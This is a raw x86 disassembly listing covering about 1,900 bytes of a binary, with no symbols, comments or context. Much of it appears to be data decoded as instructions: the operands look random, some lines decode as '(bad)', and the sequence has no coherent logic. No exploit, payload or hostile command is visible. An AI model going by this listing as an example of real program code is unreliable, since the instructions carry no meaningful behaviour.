  405d40:	mov    al,ds:0x49800184
  405d45:	dec    esp
  405d46:	sbb    ah,BYTE PTR [esi]
  405d48:	adc    al,0xa0
  405d4a:	and    BYTE PTR [eax-0x7afffbbe],bl
  405d50:	or     BYTE PTR [ebx],al
  405d52:	add    DWORD PTR [eax+ecx*1],eax
  405d55:	add    DWORD PTR [esi],ecx
  405d57:	xor    al,BYTE PTR cs:[eax-0x6e]
  405d5b:	sbb    al,0x23
  405d5d:	push   es
  405d5e:	adc    BYTE PTR [edx+eax*1],0x0
  405d62:	add    DWORD PTR [eax+ecx*1],edx
  405d65:	fisub  DWORD PTR [edi+0x41]
  405d68:	adc    al,0x0
  405d6a:	sbb    BYTE PTR ds:0x80106b,cl
  405d70:	push   eax
  405d71:	and    BYTE PTR [eax+0x1020042],dl
  405d77:	clc    
  405d78:	bound  edi,QWORD PTR [eax]
  405d7a:	sbb    cl,BYTE PTR [eax]
  405d7c:	or     BYTE PTR [edi],bl
  405d7e:	pusha  
  405d7f:	or     al,0x44
  405d81:	push   ss
  405d82:	xchg   edx,eax
  405d83:	and    dl,BYTE PTR [ecx]
  405d85:	test   DWORD PTR [ebx],esp
  405d87:	lds    ebx,FWORD PTR [ebx+0x441e5048]
  405d8d:	inc    edx
  405d8e:	add    BYTE PTR [edi],dl
  405d90:	or     BYTE PTR [eax+0x10],0x1
  405d94:	inc    eax
  405d95:	xchg   BYTE PTR [ebx+0x476a22a1],al
  405d9b:	add    eax,0x4b000b14
  405da0:	mov    al,ds:0x214d1008
  405da5:	push   eax
  405da6:	add    DWORD PTR [edx],edx
  405da8:	adc    BYTE PTR [esp+edx*1],al
  405dab:	or     al,BYTE PTR [eax]
  405dad:	add    ecx,DWORD PTR [edx+0x16869188]
  405db3:	ror    DWORD PTR [edx],0xc0
  405db6:	add    DWORD PTR [edx],0xb8e21000
  405dbc:	add    al,0x2
  405dbe:	and    DWORD PTR [eax],eax
  405dc0:	and    eax,0x2e00a0
  405dc5:	add    eax,DWORD PTR [eax]
  405dc7:	mov    al,ds:0x9000150b
  405dcc:	test   al,0x12
  405dce:	inc    eax
  405dcf:	or     BYTE PTR [edx+0x902b192],dl
  405dd5:	and    BYTE PTR [eax],bl
  405dd7:	or     BYTE PTR [edx-0x3aa52200],al
  405ddd:	xor    esp,DWORD PTR [ecx+0x40403000]
  405de3:	inc    ebx
  405de4:	adc    al,al
  405de6:	lods   eax,DWORD PTR ds:[esi]
  405de7:	or     DWORD PTR [eax],0xffffffd0
  405dea:	pop    es
  405deb:	add    dl,al
  405ded:	add    al,0x44
  405def:	pop    ecx
  405df0:	jne    0x405e33
  405df2:	add    dl,BYTE PTR [edx+0x10]
  405df5:	add    dl,BYTE PTR [eax]
  405df7:	push   cs
  405df8:	add    cl,BYTE PTR [ecx]
  405dfa:	add    DWORD PTR [edx],esp
  405dfc:	adc    al,0x8
  405dfe:	loopne 0x405e3c
  405e00:	adc    al,BYTE PTR [eax]
  405e02:	inc    ecx
  405e03:	and    BYTE PTR [edx],0x61
  405e06:	push   0x2089d20
  405e0b:	sbb    al,0x7c
  405e0d:	sub    BYTE PTR [ebx-0x70],al
  405e10:	es dec eax
  405e12:	mov    eax,0xe0c00420
  405e17:	adc    bl,BYTE PTR ds:0x111000
  405e1d:	adc    al,cl
  405e1f:	and    BYTE PTR [eax],dl
  405e21:	add    BYTE PTR [eax],0x10
  405e24:	or     BYTE PTR [ecx],bl
  405e26:	and    eax,0x28204101
  405e2b:	or     edx,DWORD PTR [ecx]
  405e2d:	push   0x92e48602
  405e32:	adc    DWORD PTR [esp+eax*2],esp
  405e35:	mov    eax,0x18240b09
  405e3a:	add    al,0x34
  405e3c:	adc    dl,BYTE PTR [eax+0x61621200]
  405e42:	add    BYTE PTR [eax],bl
  405e44:	or     cl,BYTE PTR [eax]
  405e46:	dec    eax
  405e47:	and    BYTE PTR [eax+0x20],al
  405e4a:	add    BYTE PTR [eax+eax*1],al
  405e4d:	pop    ds
  405e4e:	or     DWORD PTR [eax],ecx
  405e50:	sub    BYTE PTR [eax+0x2],ah
  405e53:	adc    edx,DWORD PTR [ecx]
  405e55:	aam    0x0
  405e57:	add    BYTE PTR [ebx+0x149950],dl
  405e5d:	add    BYTE PTR [ebp*2+0x2a210090],dl
  405e64:	add    al,0x61
  405e66:	inc    eax
  405e67:	and    cl,0x0
  405e6a:	dec    ecx
  405e6b:	add    BYTE PTR [edx+0x9],dl
  405e6e:	add    DWORD PTR [edx+0x1100d02],0x410c2050
  405e78:	and    BYTE PTR [ecx+eax*1],ch
  405e7b:	adc    BYTE PTR [edx],al
  405e7d:	and    cl,0x9
  405e80:	js     0x405ea2
  405e82:	dec    ecx
  405e83:	add    BYTE PTR [esi],al
  405e85:	sbb    BYTE PTR [eax+eax*8],dl
  405e88:	add    BYTE PTR [eax+ecx*1],al
  405e8b:	sub    BYTE PTR [eax],0x0
  405e8e:	add    al,0xa4
  405e90:	add    BYTE PTR [ebp+0x8e00200],cl
  405e96:	mov    BYTE PTR [eax+0x0],ah
  405e99:	or     al,0x0
  405e9b:	ret    
  405e9c:	push   eax
  405e9d:	sbb    al,BYTE PTR [edi]
  405e9f:	add    bl,BYTE PTR [esp+eax*1+0x20901000]
  405ea6:	push   eax
  405ea7:	sbb    BYTE PTR [edx+0x40],dh
  405eaa:	adc    BYTE PTR [ecx+0x0],ah
  405ead:	add    BYTE PTR [eax-0x40],al
  405eb0:	mov    WORD PTR [edx+0x44000100],es
  405eb6:	in     al,0x8a
  405eb8:	inc    eax
  405eb9:	inc    eax
  405eba:	ret    0x4
  405ebd:	inc    esp
  405ebe:	add    al,0x0
  405ec0:	add    BYTE PTR [eax],al
  405ec2:	sbb    DWORD PTR [esi],eax
  405ec4:	add    BYTE PTR [eax+eax*4],bl
  405ec7:	adc    BYTE PTR [ecx+eax*2],0xe
  405ecb:	leave  
  405ecc:	inc    edx
  405ecd:	add    BYTE PTR [ebp+0x4],al
  405ed0:	enter  0x200,0x0
  405ed4:	inc    esp
  405ed5:	add    al,BYTE PTR [edx+0x2c210]
  405edb:	and    al,0x0
  405edd:	inc    eax
  405ede:	and    BYTE PTR [edx],0x21
  405ee1:	pop    eax
  405ee2:	add    BYTE PTR [edi],al
  405ee4:	rol    BYTE PTR [eax],0x0
  405ee7:	rol    BYTE PTR [eax+0x40080004],1
  405eed:	add    DWORD PTR [eax],ecx
  405eef:	and    eax,0x2050a20
  405ef4:	add    dl,BYTE PTR [eax]
  405ef6:	add    BYTE PTR [eax+0x20],al
  405ef9:	add    BYTE PTR [eax],al
  405efb:	xor    BYTE PTR [eax+eax*1],al
  405efe:	sbb    DWORD PTR [edx+0xe5100e],ecx
  405f04:	and    edx,DWORD PTR [eax]
  405f06:	adc    al,0x21
  405f08:	push   esp
  405f09:	add    BYTE PTR [eax],cl
  405f0b:	add    eax,0x68404840
  405f10:	mov    BYTE PTR [esi+ecx*1],ah
  405f13:	add    BYTE PTR [eax],0x84
  405f16:	bound  eax,QWORD PTR [eax]
  405f18:	add    BYTE PTR [ecx+ecx*1],dl
  405f1b:	dec    edx
  405f1c:	add    BYTE PTR [edx+0x4100000],dl
  405f22:	or     BYTE PTR [eax+0x10410d00],al
  405f28:	add    al,BYTE PTR [eax]
  405f2a:	add    BYTE PTR [edx],al
  405f2c:	add    BYTE PTR [eax],0x0
  405f2f:	add    BYTE PTR [eax],bl
  405f31:	inc    edx
  405f32:	add    BYTE PTR [eax+eax*4],0x40
  405f36:	add    BYTE PTR [edx+0xa080000],al
  405f3c:	xor    BYTE PTR [edx],al
  405f3e:	inc    edx
  405f3f:	sub    BYTE PTR [ecx],al
  405f41:	push   eax
  405f42:	retf   0x4e02
  405f45:	sbb    BYTE PTR [eax+0x1],cl
  405f48:	add    al,BYTE PTR [eax+0x8]
  405f4b:	add    DWORD PTR [eax],eax
  405f4d:	add    cl,al
  405f4f:	inc    eax
  405f50:	inc    eax
  405f51:	and    cl,BYTE PTR [esi]
  405f53:	add    BYTE PTR [eax],al
  405f55:	xor    BYTE PTR [edx],al
  405f57:	add    BYTE PTR [ecx+0x204c340],al
  405f5d:	add    BYTE PTR [ecx+eax*2],0x89
  405f61:	inc    edx
  405f62:	fadd   QWORD PTR [ecx+0x58]
  405f68:	add    DWORD PTR [eax],eax
  405f6a:	add    al,0x29
  405f6c:	and    BYTE PTR [esp+esi*4+0x82080],0x0
  405f74:	or     BYTE PTR [eax+eax*1],0x2
  405f78:	add    BYTE PTR [eax],al
  405f7a:	add    ah,BYTE PTR [eax]
  405f7c:	add    BYTE PTR [eax+eax*4-0x70],al
  405f80:	and    BYTE PTR [ecx+0x13],al
  405f83:	add    BYTE PTR [eax],al
  405f85:	add    al,al
  405f87:	and    BYTE PTR [eax],ch
  405f89:	and    BYTE PTR [eax],al
  405f8b:	add    BYTE PTR [ebx],ah
  405f8d:	add    BYTE PTR [ecx],al
  405f8f:	adc    al,BYTE PTR [eax]
  405f91:	add    BYTE PTR [edx+eax*1],al
  405f94:	add    al,0x2
  405f96:	inc    eax
  405f97:	add    al,BYTE PTR [eax]
  405f99:	add    BYTE PTR [ecx+0x8238008],bl
  405f9f:	adc    BYTE PTR [eax+0x22000290],al
  405fa5:	adc    BYTE PTR [edx+0x0],cl
  405fa8:	and    BYTE PTR ds:0x310810,dh
  405fae:	add    al,0x43
  405fb0:	add    BYTE PTR [ecx],0x98
  405fb3:	and    al,BYTE PTR [eax+0x0]
  405fb6:	add    BYTE PTR [eax+0x44],ah
  405fb9:	mov    al,0x0
  405fbb:	add    BYTE PTR [ecx-0x70],al
  405fbe:	adc    ch,BYTE PTR [esp+ebp*1+0x53]
  405fc2:	mov    WORD PTR fs:[ebx],es
  405fc5:	add    DWORD PTR [eax+0x41],esp
  405fc8:	add    BYTE PTR [eax],dl
  405fca:	add    BYTE PTR [edx],al
  405fcc:	inc    eax
  405fcd:	add    DWORD PTR [esi],ecx
  405fcf:	and    BYTE PTR ds:0x18818562,al
  405fd5:	(bad)  
  405fd6:	add    DWORD PTR [ebx],0x4000300
  405fdc:	or     BYTE PTR [edx],al
  405fde:	adc    al,0x0
  405fe0:	adc    BYTE PTR [eax],al
  405fe2:	adc    BYTE PTR [ecx+0x18459200],al
  405fe8:	or     BYTE PTR [eax],al
  405fea:	lock and eax,0x8008001
  405ff0:	and    al,0x0
  405ff2:	or     eax,0x160080c
  405ff7:	inc    eax
  405ff8:	inc    eax
  405ff9:	push   cs
  405ffa:	add    DWORD PTR [eax+0x4],ebx
  405ffd:	and    BYTE PTR [eax],al
  405fff:	pusha  
  406000:	add    al,0x0
  406002:	and    BYTE PTR [eax+edx*1],al
  406005:	mov    al,ds:0x80010220
  40600a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600b:	nop
  40600c:	add    BYTE PTR [edx],ah
  40600e:	add    al,0x40
  406010:	rcr    BYTE PTR [ebx+0x0],0x15
  406014:	and    BYTE PTR [eax+ecx*2-0x7ff75000],0xc0
  40601c:	add    DWORD PTR [ecx+0x0],eax
  40601f:	add    BYTE PTR [ebx+edi*1],0x20
  406023:	inc    edx
  406024:	adc    BYTE PTR [eax],dh
  406026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406027:	shr    BYTE PTR [ecx+0x10],0x0
  40602b:	and    DWORD PTR [eax],edx
  40602d:	or     BYTE PTR [eax],al
  40602f:	add    DWORD PTR [eax+eax*1],eax
  406032:	add    DWORD PTR [esp+edx*8],eax
  406035:	adc    BYTE PTR [eax],0x28
  406038:	add    al,0x85
  40603a:	adc    BYTE PTR [eax],al
  40603c:	pusha  
  40603d:	ins    DWORD PTR es:[edi],dx
  40603e:	add    BYTE PTR [edi],dl
  406040:	add    BYTE PTR [eax],cl
  406042:	add    BYTE PTR [eax+eax*4+0x840000],0x0
  40604a:	add    DWORD PTR [edx],eax
  40604c:	pusha  
  40604d:	add    BYTE PTR [eax+0x4001041],al
  406053:	xchg   BYTE PTR [eax],ah
  406055:	or     ah,BYTE PTR [esi]
  406057:	popa   
  406058:	add    BYTE PTR [eax],al
  40605a:	adc    BYTE PTR [ecx+0x0],al
  40605d:	add    DWORD PTR [eax],eax
  40605f:	add    BYTE PTR [edx],ah
  406061:	and    al,0x3c
  406063:	pop    es
  406064:	and    BYTE PTR [eax+0x11029810],dl
  40606a:	add    dl,BYTE PTR [ecx]
  40606c:	add    BYTE PTR [eax],al
  40606e:	add    dl,BYTE PTR [eax+0x10]
  406071:	xchg   esp,eax
  406072:	add    BYTE PTR [eax],al
  406074:	add    BYTE PTR [eax+0x3],0x80
  406078:	add    BYTE PTR [ecx],0x1b
  40607b:	pop    es
  40607c:	add    BYTE PTR [edx*1+0x20400c48],al
  406083:	add    BYTE PTR [eax],al
  406085:	xor    BYTE PTR [eax-0x7c],al
  406088:	xor    BYTE PTR [eax+0x618ea060],ah
  40608e:	add    BYTE PTR [eax],dl
  406090:	pusha  
  406091:	adc    BYTE PTR [eax-0x30],ah
  406094:	inc    eax
  406095:	mov    DWORD PTR ds:0x4010c144,esi
  40609b:	mov    BYTE PTR [eax+0x98b80c0],ah
  4060a1:	nop
  4060a2:	fcmovne st,st(0)
  4060a4:	mov    ds:0x800042,eax
  4060a9:	or     al,BYTE PTR [ecx+0x8000503]
  4060af:	adc    BYTE PTR [eax],cl
  4060b1:	mov    al,BYTE PTR [edx+esi*1]
  4060b4:	add    BYTE PTR [eax],al
  4060b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b7:	add    BYTE PTR [eax],al
  4060b9:	or     BYTE PTR [ecx],0x0
  4060bc:	sbb    cl,BYTE PTR [eax]
  4060be:	add    BYTE PTR [ebx+0x2],al
  4060c1:	adc    DWORD PTR [eax+0x0],edx
  4060c4:	sub    DWORD PTR [eax],esp
  4060c6:	add    BYTE PTR [eax+eiz*2],al
  4060c9:	add    BYTE PTR [eax],al
  4060cb:	add    al,0x6
  4060cd:	or     al,0x0
  4060d0:	add    al,0x2
  4060d2:	and    al,0x80
  4060d4:	inc    eax
  4060d5:	xchg   esp,eax
  4060d6:	add    BYTE PTR [eax],ch
  4060d8:	or     al,0x0
  4060da:	add    BYTE PTR [eax],al
  4060dc:	push   eax
  4060dd:	lds    ebx,FWORD PTR [eax]
  4060df:	nop
  4060e0:	mov    al,ds:0x908685b
  4060e5:	add    BYTE PTR [edx],0x20
  4060e8:	dec    eax
  4060e9:	enter  0x1010,0x3
  4060ed:	and    BYTE PTR [eax],al
  4060ef:	inc    eax
  4060f0:	inc    eax
  4060f1:	or     DWORD PTR [eax],esp
  4060f3:	or     BYTE PTR [ecx+0x23],dl
  4060f6:	ret    0xa0
  4060f9:	inc    edi
  4060fa:	add    BYTE PTR [eax+eax*1],0x1
  4060fe:	push   edx
  4060ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406100:	dec    edx
  406101:	or     dh,BYTE PTR [eax]
  406103:	inc    eax
  406104:	push   es
  406105:	or     al,0x42
  406107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406108:	xor    BYTE PTR [eax+0xc100],cl
  40610e:	inc    eax
  40610f:	xor    DWORD PTR [eax+0x0],edx
  406112:	add    al,0x0
  406114:	xchg   esp,eax
  406115:	and    eax,DWORD PTR [eax]
  406117:	push   0x59
  406119:	and    al,0x84
  40611b:	inc    edx
  40611c:	push   ss
  40611d:	inc    esi
  40611e:	add    BYTE PTR [eax],al
  406120:	inc    edx
  406121:	pusha  
  406122:	mov    DWORD PTR [eax+0x2124810],ecx
  406128:	adc    BYTE PTR [eax+0x48],al
  40612b:	pusha  
  40612c:	pusha  
  40612d:	add    dl,BYTE PTR [eax+0x6]
  406130:	add    BYTE PTR ds:0x12000,al
  406136:	inc    eax
  406137:	add    BYTE PTR [eax],al
  406139:	pusha  
  40613a:	push   eax
  40613b:	xchg   ebp,eax
  40613c:	dec    eax
  40613d:	add    BYTE PTR [eax+0xa],al
  406140:	add    BYTE PTR [eax],al
  406142:	adc    DWORD PTR [ebp+0x41204814],edx
  406148:	push   eax
  406149:	add    BYTE PTR [edx],cl
  40614b:	inc    eax
  40614c:	mov    BYTE PTR [eax],al
  40614e:	add    BYTE PTR [eax+0x60040220],cl
  406154:	test   al,0x2
  406156:	mov    eax,0x2800b160
  40615b:	add    BYTE PTR [eax],al
  40615d:	add    eax,DWORD PTR [ecx]
  40615f:	add    al,BYTE PTR [ebp+0x20]
  406162:	xchg   ebx,eax
  406163:	add    al,al
  406165:	add    DWORD PTR [eax-0x7c],edx
  406168:	cmp    DWORD PTR [eax],eax
  40616a:	adc    BYTE PTR [edx],al
  40616c:	and    BYTE PTR [eax],ch
  40616e:	add    BYTE PTR [eax+eax*1],al
  406171:	add    al,BYTE PTR [eax]
  406173:	and    BYTE PTR [eax],dl
  406175:	push   0x10001086
  40617a:	pop    ebp
  40617b:	inc    edx
  40617c:	push   eax
  40617d:	add    BYTE PTR [eax],al
  40617f:	push   edx
  406180:	add    BYTE PTR [ecx-0x58],dl
  406183:	sbb    BYTE PTR [ecx],al
  406185:	inc    ebx
  406186:	add    BYTE PTR [esi+0x60],al
  406189:	and    al,0x2c
  40618b:	add    BYTE PTR [eax+0x0],ch
  40618e:	add    BYTE PTR [eax+0x2004001],0x20
  406195:	add    DWORD PTR [eax],esi
  406197:	pusha  
  406198:	add    BYTE PTR [eax+eiz*2+0x40004102],dl
  40619f:	add    al,0x0
  4061a1:	nop
  4061a2:	adc    BYTE PTR [ebp+0x42800040],dl
  4061a8:	or     DWORD PTR [ecx+edx*4+0x60],esp
  4061ac:	add    BYTE PTR [eax],al
  4061ae:	test   BYTE PTR [eax+eiz*1],ah
  4061b1:	rcr    BYTE PTR [eax],0x0
  4061b4:	mov    al,ds:0x2a04021
  4061b9:	pop    ebp
  4061ba:	add    BYTE PTR [ecx-0x7fedcf00],dl
  4061c0:	inc    esp
  4061c1:	add    DWORD PTR [eax],eax
  4061c3:	add    DWORD PTR [ecx],eax
  4061c5:	add    cl,al
  4061c7:	shl    BYTE PTR [edx],0x0
  4061ca:	inc    eax
  4061cb:	rol    BYTE PTR [ebp+0x40],0x0
  4061cf:	add    BYTE PTR [eax+0x22],al
  4061d2:	lock inc eax
  4061d4:	add    BYTE PTR [edx],bl
  4061d6:	add    dh,BYTE PTR [eax]
  4061d8:	dec    esp
  4061d9:	jo     0x4061f3
  4061db:	mov    al,ds:0x20018041
  4061e0:	mov    BYTE PTR [eax*1+0x8004000],al
  4061e7:	add    BYTE PTR [edx],bl
  4061e9:	mov    al,ds:0x120011
  4061ee:	inc    esi
  4061ef:	or     DWORD PTR [ecx],eax
  4061f1:	stos   BYTE PTR es:[edi],al
  4061f2:	add    BYTE PTR [ecx],al
  4061f4:	or     ah,BYTE PTR [ecx]
  4061f6:	add    dl,dh
  4061f8:	add    al,0x40
  4061fa:	and    al,BYTE PTR [eax]
  4061fc:	adc    ah,BYTE PTR [eax+eax*1]
  4061ff:	add    al,0x0
  406201:	adc    BYTE PTR [edx],cl
  406203:	add    BYTE PTR [eax+0x12483044],al
  406209:	add    BYTE PTR [eax+0xa],dl
  40620c:	add    eax,0x48801006
  406211:	add    eax,0x62a0406
  406216:	inc    esi
  406217:	mov    BYTE PTR [eax],al
  406219:	dec    eax
  40621a:	xor    DWORD PTR ds:0x40058125,ecx
  406220:	or     DWORD PTR [eax],eax
  406222:	cmp    BYTE PTR [eax],ah
  406224:	mov    ecx,0x41003124
  406229:	add    al,BYTE PTR [eax]
  40622b:	mov    ds:0xe3200324,eax
  406230:	pop    ss
  406231:	dec    eax
  406232:	adc    DWORD PTR [eax+0x13022089],0x440400f
  40623c:	add    BYTE PTR [ecx],dh
  40623e:	adc    al,BYTE PTR [esp+eax*1]
  406241:	add    BYTE PTR [eax],dh
  406243:	mov    al,BYTE PTR [eax]
  406245:	add    BYTE PTR [ecx+0x7],al
  406248:	inc    edx
  406249:	adc    eax,0x8240e0
  40624e:	or     al,BYTE PTR [eax+0x1a]
  406251:	mov    al,ds:0xb01440
  406256:	pop    DWORD PTR [eax+0x820108]
  40625c:	and    BYTE PTR [eax+0x1],ah
  40625f:	inc    ebx
  406260:	mov    al,ds:0xacc24032
  406265:	or     BYTE PTR [eax],al
  406267:	cmp    BYTE PTR [edx],al
  406269:	add    BYTE PTR [esi+0x0],dl
  40626c:	ret    0x282
  40626f:	add    DWORD PTR [eax],ecx
  406271:	fsub   DWORD PTR [edx+0x0]
  406274:	adc    BYTE PTR [ecx],cl
  406276:	ss add eax,0xd0084c0
  40627c:	inc    edx
  40627d:	sbb    al,0x10
  406280:	add    al,0x2a
  406282:	imul   edx,DWORD PTR [esi+0x12000200],0x2
  406289:	bound  edx,QWORD PTR [eax+0x0]
  40628c:	add    BYTE PTR [eax],al
  40628e:	mov    ch,0x44
  406290:	nop
  406291:	inc    eax
  406292:	add    BYTE PTR [ecx+0x0],al
  406295:	or     BYTE PTR [esi+0x6],al
  406298:	and    eax,DWORD PTR [eax]
  40629a:	dec    edx
  40629b:	add    dl,BYTE PTR [eax]
  40629d:	dec    eax
  40629e:	and    BYTE PTR [eax],0x0
  4062a1:	mov    al,BYTE PTR [edi+0x30]
  4062a4:	test   BYTE PTR [ecx],cl
  4062a6:	rcl    BYTE PTR [ebx],0x23
  4062a9:	xor    BYTE PTR [eax],dh
  4062ab:	and    DWORD PTR [eax+0x0],ecx
  4062ae:	inc    edx
  4062af:	add    DWORD PTR [ebx-0x70000000],ecx
  4062b5:	adc    BYTE PTR [eax],al
  4062b7:	add    DWORD PTR [edx+0x1c],eax
  4062ba:	mov    BYTE PTR [eax+eax*1],al
  4062bd:	add    BYTE PTR [esp+edx*1],dl
  4062c0:	bound  eax,QWORD PTR [eax]
  4062c2:	add    al,0x10
  4062c4:	adc    al,BYTE PTR [eax+eax*2]
  4062c7:	and    BYTE PTR [edi+0x1],dh
  4062ca:	mov    al,ds:0x40000a01
  4062cf:	sub    BYTE PTR [edx],al
  4062d1:	inc    eax
  4062d2:	add    BYTE PTR [eax],al
  4062d4:	add    BYTE PTR [edi+eax*1],al
  4062d7:	push   ecx
  4062d8:	add    BYTE PTR [eax+eax*1],bl
  4062db:	add    BYTE PTR [eax],al
  4062dd:	or     al,0x0
  4062df:	add    BYTE PTR [eax+0x0],0x20
  4062e3:	inc    eax
  4062e4:	push   0x20cc642
  4062e9:	xor    al,al
  4062eb:	inc    eax
  4062ec:	add    cl,BYTE PTR [edi]
  4062ee:	add    BYTE PTR [ebx+eax*2],al
  4062f1:	inc    eax
  4062f2:	adc    BYTE PTR [eax],al
  4062f4:	add    BYTE PTR [ecx],cl
  4062f6:	add    al,0x35
  4062f8:	add    BYTE PTR [eax],al
  4062fa:	and    BYTE PTR [eax],al
  4062fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062fd:	push   eax
  4062fe:	add    DWORD PTR [edx],esi
  406300:	add    BYTE PTR [edx+eiz*4],al
  406303:	adc    al,0x40
  406305:	adc    al,0x0
  406307:	add    BYTE PTR [eax+0x15],al
  40630a:	add    DWORD PTR [eax+0x1000420d],eax
  406310:	and    BYTE PTR [eax],al
  406312:	add    dl,BYTE PTR [esp+ebx*1]
  406315:	push   ecx
  406316:	sbb    BYTE PTR [esi+0x10193a44],ah
  40631c:	adc    ah,BYTE PTR [ecx]
  40631e:	or     BYTE PTR [eax],al
  406320:	rol    BYTE PTR [ecx+0x2001001],0x8
  406327:	outs   dx,BYTE PTR ds:[esi]
  406328:	inc    eax
  406329:	add    BYTE PTR [eax+0x20],al
  40632c:	inc    eax
  40632d:	add    BYTE PTR [ecx+0x74],ah
  406330:	dec    eax
  406331:	inc    eax
  406332:	add    BYTE PTR [eax],dl
  406334:	add    BYTE PTR [edx],cl
  406336:	dec    eax
  406337:	and    DWORD PTR [eax],0xc6049a25
  40633d:	and    al,0x2c
  40633f:	add    BYTE PTR [eax],ch
  406341:	add    eax,DWORD PTR [edx]
  406343:	or     al,0xa
  406345:	or     BYTE PTR [edi+0x0],al
  406348:	rol    BYTE PTR [eax],0x2
  40634b:	add    BYTE PTR es:[edx],al
  40634e:	add    BYTE PTR [edx],ah
  406350:	add    BYTE PTR [edx],al
  406352:	add    BYTE PTR [eax+0x1401049],al
  406358:	add    al,0x0
  40635a:	inc    edx
  40635b:	or     DWORD PTR [eax],0x2
  40635e:	add    al,BYTE PTR [ebp+0x2]
  406361:	add    bl,BYTE PTR [edi+0x2]
  406364:	add    BYTE PTR [eax],al
  406366:	dec    edx
  406367:	add    al,BYTE PTR [eax+0x40]
  40636a:	add    BYTE PTR [eax],al
  40636c:	add    al,0x6
  40636e:	add    al,0x4c
  406370:	add    DWORD PTR [eax],0x2018080
  406376:	add    DWORD PTR [eax],0x80080008
  40637c:	xor    al,ah
  40637e:	add    BYTE PTR [eax+0x10],cl
  406381:	add    al,BYTE PTR [edx]
  406383:	ret    0x1010
  406386:	add    BYTE PTR [edx+eiz*1],cl
  406389:	push   eax
  40638a:	and    BYTE PTR [eax],al
  40638c:	and    al,BYTE PTR [ebx]
  40638e:	add    BYTE PTR [edx+0x0],al
  406391:	dec    eax
  406392:	add    BYTE PTR [eax+0x1844048],al
  406398:	push   ecx
  406399:	push   edx
  40639a:	sub    BYTE PTR [ecx],cl
  40639c:	add    BYTE PTR [ebp+0x8],bl
  40639f:	add    DWORD PTR [esi],ecx
  4063a1:	add    BYTE PTR [eax+0x6080d80],al
  4063a7:	add    BYTE PTR [eax+0x0],bl
  4063aa:	and    BYTE PTR [ebx+0x12884115],ah
  4063b0:	nop
  4063b1:	add    eax,0x1a0040
  4063b6:	or     BYTE PTR [eax],dl
  4063b8:	add    BYTE PTR [eax],al
  4063ba:	pusha  
  4063bb:	add    eax,DWORD PTR [edx]
  4063bd:	add    BYTE PTR [ecx+0x42],al
  4063c0:	mov    eax,ds:0x40a814c0
  4063c5:	add    ah,BYTE PTR [eax+eax*1+0x49]
  4063c9:	add    BYTE PTR [eax+ebx*1+0x116a5b32],0x2
  4063d1:	and    DWORD PTR [ecx],eax
  4063d3:	(bad)  
  4063d4:	and    BYTE PTR [eax+0x21104281],dl
  4063da:	add    BYTE PTR [ecx+eax*8],dl
  4063dd:	add    BYTE PTR [eax],cl
  4063df:	add    dl,BYTE PTR [eax]
  4063e1:	mov    al,ds:0xe20000
  4063e6:	ret    
  4063e7:	and    BYTE PTR [eax],al
  4063e9:	add    eax,DWORD PTR [ecx]
  4063eb:	nop
  4063ec:	add    al,0xc
  4063ee:	adc    BYTE PTR [eax+ebp*1],cl
  4063f1:	add    BYTE PTR [eax],al
  4063f3:	or     BYTE PTR [eax],ah
  4063f5:	mov    es,WORD PTR [eax]
  4063f7:	or     al,0x84
  4063f9:	loopne 0x40643b
  4063fb:	add    BYTE PTR [eax+eax*4-0x7fffc000],al
  406402:	adc    al,BYTE PTR [eax+0x8]
  406405:	add    al,0x10
  406407:	add    BYTE PTR [eax-0x7f],al
  40640a:	inc    eax
  40640b:	and    BYTE PTR [ebx],ah
  40640d:	add    BYTE PTR [ecx+0x15],bh
  406410:	add    BYTE PTR [eax],ah
  406412:	imul   eax,DWORD PTR [ebx-0x7c],0x1000a004
  406419:	sbb    BYTE PTR [ecx],bl
  40641b:	pop    eax
  40641c:	rcl    BYTE PTR [ebx+0x40],1
  40641f:	inc    ecx
  406420:	xchg   esp,eax
  406421:	adc    BYTE PTR [eax+0x0],dl
  406424:	add    BYTE PTR [ecx],cl
  406426:	adc    al,BYTE PTR [esp+eax*2]
  406429:	add    BYTE PTR [eax+0x0],al
  40642c:	sbb    BYTE PTR [eax+0x5582c1c0],0x0
  406433:	add    BYTE PTR [eax],al
  406435:	add    BYTE PTR [eax+0x51a00c00],0x1
  40643c:	add    BYTE PTR [eax],al
  40643e:	add    ebp,DWORD PTR [eax]
  406440:	inc    esi
  406441:	retf   0x1
  406444:	test   BYTE PTR [ecx],al
  406446:	add    DWORD PTR [eax],eax
  406448:	add    BYTE PTR ds:0x646d4421,ah
  40644e:	mov    ds:0xc8021050,eax
  406453:	push   eax
  406454:	or     cl,BYTE PTR [eax+0x0]
  406457:	adc    BYTE PTR [ecx],al
  406459:	sub    edx,DWORD PTR [edx]
  40645b:	add    ah,BYTE PTR [edx+0x804000a]
  406461:	add    DWORD PTR [eax],eax
  406463:	and    BYTE PTR [eax+0x40020040],ah
  406469:	test   DWORD PTR [ebx],eax
  40646b:	inc    eax
  40646c:	shl    BYTE PTR [eax],1
  40646e:	and    BYTE PTR [eax],cl
  406470:	or     BYTE PTR [eax],0xc0
  406473:	or     eax,0x302020
  406478:	or     al,0x4
  40647a:	add    BYTE PTR [eax],dl
  40647c:	inc    eax
  40647d:	or     edx,DWORD PTR [eax]
  40647f:	or     al,0x5d
  406481:	inc    eax
  406482:	add    BYTE PTR [ecx+0x8],dl
  406485:	dec    edx
  406486:	dec    esp
  406487:	add    BYTE PTR [edx+0xe101038],ah
  40648d:	and    esp,esp
  40648f:	dec    eax
  406490:	mov    ds:0x49400016,al
  406495:	add    BYTE PTR [eax],0x20
  406498:	push   eax
  406499:	add    al,0x80
  40649b:	sbb    al,BYTE PTR [edx+0x20001]
  4064a1:	add    BYTE PTR [ecx],bl
  4064a3:	add    cl,BYTE PTR [eax+eiz*1]
  4064a6:	xor    DWORD PTR [eax],eax
  4064a8:	add    BYTE PTR [eax],al
  4064aa:	dec    edx
  4064ab:	add    BYTE PTR [eax+0x20],ah
  4064ae:	xor    ah,BYTE PTR [edx-0x7ffc7e00]
  4064b4:	add    DWORD PTR [esi+eax*2],0x6a801801
  4064bb:	adc    DWORD PTR [eax+0x28102006],eax
  4064c1:	inc    ecx
  4064c2:	add    dl,BYTE PTR [eax]
  4064c4:	add    BYTE PTR [eax+0x10],al
  4064c7:	add    al,0x0
